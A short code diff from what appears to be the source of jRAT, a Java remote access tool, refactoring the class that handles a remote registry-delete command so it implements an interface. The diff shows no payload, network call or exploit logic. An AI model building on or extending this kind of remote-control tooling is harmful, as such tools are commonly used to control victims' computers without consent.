@@ -1,10 +1,10 @@
 package jrat.module.registry;
 
 import jrat.client.Connection;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPacket;
 import oslib.OperatingSystem;
 
-public class Packet99RegistryDelete extends AbstractIncomingPacket {
+public class Packet99RegistryDelete implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
